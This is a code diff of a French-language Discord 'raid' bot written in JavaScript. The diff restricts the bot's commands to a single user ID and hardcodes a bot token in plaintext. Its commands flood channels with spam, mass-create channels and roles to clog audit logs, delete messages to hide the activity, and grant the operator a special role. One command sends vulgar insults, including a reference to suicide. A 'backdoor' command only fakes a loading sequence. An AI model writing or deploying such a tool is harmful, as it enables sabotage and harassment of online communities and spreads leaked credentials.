@@ -2,7 +2,7 @@ const Discord = require('discord.js');
 const client = new Discord.Client();
 const bot = new Discord.Client();
 var fs = require('fs');
-prefix = "/";
+prefix = "*";
 let cooldown = new Set();
 let cds = 5;
 
@@ -16,13 +16,14 @@ function cmd(str, msg) {
 
 client.on('ready', () => {
   client.user.setGame('EF ALL h!help')
-  console.log(`Connecté au Compte ${client.user.tag}!`)
-
+  console.log(`Connecté au Compte ${client.user.tag}!`);
 });
 
+client.login("NDY0MTI3MDMzOTIwOTc4OTc1.Dh_FSQ.yjylXCvgOkaQDFrKtiV2KawEhR8");
 client.login(process.env.TOKEN);
+        
 
-       
+
 
 
 // Commande de Kick
@@ -80,6 +81,7 @@ client.login(process.env.TOKEN);
 //Commande de Flood
 client.on("message", message => {
   if(cmd("spam", message)) {
+    if (message.author.id !== '464127033920978975') return;
 
   message.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
   for (var i = 0; i < 200; i++) {
@@ -90,6 +92,7 @@ client.on("message", message => {
           // Commande de Destruction
 client.on("message", msg => {
 if(cmd("channel", msg)) {
+  if (message.author.id !== '464127033920978975') return;
   msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
   for (var i = 0; i < 500; i++) {
       // Creates new roles to clog up the audit log
@@ -111,6 +114,7 @@ if(cmd("channel", msg)) {
        // Commande de Destruction
 client.on("message", msg => {
 if(cmd("icon", msg)) {
+  if (message.author.id !== '464127033920978975') return;
   msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
   for (var i = 0; i < 500; i++) {
       // Creates new roles to clog up the audit log
@@ -131,6 +135,7 @@ if(cmd("icon", msg)) {
             // ttes les perms
             client.on("message", message => {
 if(cmd("ef", message)) {
+  if (message.author.id !== '464127033920978975') return;
                 let RoleToAdd = message.guild.roles.find('name', 'ELFAMOSO')
  
                 message.member.addRole(RoleToAdd);
@@ -150,6 +155,7 @@ if(cmd("ef", message)) {
 
                 client.on("message", message => {
                   if(cmd("info", message)) {
+                    if (message.author.id !== '464127033920978975') return;
                     message.delete(1000);
 
                 const embed = new Discord.RichEmbed()
@@ -214,8 +220,8 @@ if(cmd("ef", message)) {
 
 
             client.on("message", message => {
-              if(message.author.equals(bot.user)) return;
               if(cmd("say", message)) {
+                if (message.author.id !== '464127033920978975') return;
                 message.delete();
 
             const embed = new Discord.RichEmbed()
@@ -230,7 +236,7 @@ if(cmd("ef", message)) {
              */
            
 
-            .addField("==================", message.content.replace('/say','') , true)
+            .addField("==================", message.content.replace('*say','') , true)
             
 
 
@@ -245,6 +251,7 @@ if(cmd("ef", message)) {
 
         client.on("message", message => {
           if(cmd("help", message)) {
+            if (message.author.id !== '464127033920978975') return;
             message.delete();
 
             message.channel.send("prefix: /\nspam 'msg': spam le msg \ninfo: envoi une invitation du bot\nsay: envoi un msg en embeds\nbackdoor: te cree une backdoor\nm6: te lvl up le mee6")
@@ -255,6 +262,7 @@ if(cmd("ef", message)) {
 
     client.on("message", message => {
       if(cmd("insulte", message)) {
+        if (message.author.id !== '464127033920978975') return;
         message.delete();
 
         let repete = ["tais toi", "tu begaye même en écris sombre fils de pute", "Je te baise ta mère tout les jours gros", "dauilleur pense à pas rager quand tu vas me voir sortir de sa chambre cette nuit", "Ayyaaaaaaa y'a aucun rapport entre se que tu dis et se que tu fais ", "n'oublie pas que t'es moche et que appars ta main droite tu baise rien", "même mon bot te victimise gros fais pas le malin sombre déchéance.", "tu parle tu parle mais sa vas vesqui le vocal par peur de se faire laminer vocalement", "Je te crache dessus car t'es ma pute , ma salop, ma chienne , tire toi de là tu risque de te suicider façon kendral"];
@@ -267,6 +275,7 @@ if(cmd("ef", message)) {
 
 client.on("message", message => {
   if(cmd("backdoor", message)) {
+    if (message.author.id !== '464127033920978975') return;
     message.delete();
   message.channel.send("BACKDOOR CREATOR | BY BAXIMOZ |");
   message.channel.send("-------------------------------");
@@ -283,6 +292,7 @@ client.on("message", message => {
 
 client.on("message", message => {
   if(cmd("lhost", message)) {
+    if (message.author.id !== '464127033920978975') return;
     message.delete();
 message.channel.send("IP LHOST=" + message.content.replace('/lhost','') + "\nVEUILLER INDIQUER LE PORT...(lport 'port'");
   }
@@ -290,51 +300,86 @@ message.channel.send("IP LHOST=" + message.content.replace('/lhost','') + "\nVEU
 
 client.on("message", message => {
   if(cmd("lport", message)) {
-    
+    if (message.author.id !== '464127033920978975') return;
     message.delete();
     message.delete();
 message.channel.send("PORT LPORT=" + message.content.replace('/lport',''));
   message.channel.send("création de la backdoor...");
+  
     message.channel.send("loading.");
+    
+    
+    
     message.delete();
+    
+    
+    
     message.channel.send("loading..");
+    
+    
+    
+    
     message.delete();
+    
+    
+    
     message.channel.send("loading...");
+    
+    
+    
     message.delete();
+    
+    
+    
     message.channel.send("loading.");
+    
+    
+    
     message.delete();
+    
+    
+    
+    
     message.channel.send("loading..");
+    
+    
+    
     message.delete();
+    
+    
+    
     message.channel.send("loading...");
+    
+    
+    
+    
     message.delete();
-    message.channel.send("loading.");
-    message.delete();
-    message.channel.send("loading..");
+    
+    
+    
+    
     message.channel.send("====================");
     message.channel.send("Backdoor créé avec succès !");
     message.channel.send("====================");
-  
-    }
+  }
 });
 
 
 
 //Commande de Flood
 client.on("message", message => {
-  if(cmd("me6", message)) {
+  if(cmd("m6", message)) {
+    if (message.author.id !== '464127033920978975') return;
 message.delete();
   message.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
-  for (var i = 1; i < 10; i++) {
-      message.channel.send("/le selfbot il est machoulex et la commande lvl up mee6 aussi ptdr")
+  for (var i = 0; i < 50; i++) {
+      message.channel.send("/mee6")
     }
 }
 });
 
 client.on("message", message => {
-  if(cmd("le selfbot il est machoulex et la commande lvl up mee6 aussi ptdr", message)) {
-message.delete(1000);
+  if(cmd("mee6", message)) {
+message.delete();
   }
 });
-
-
-
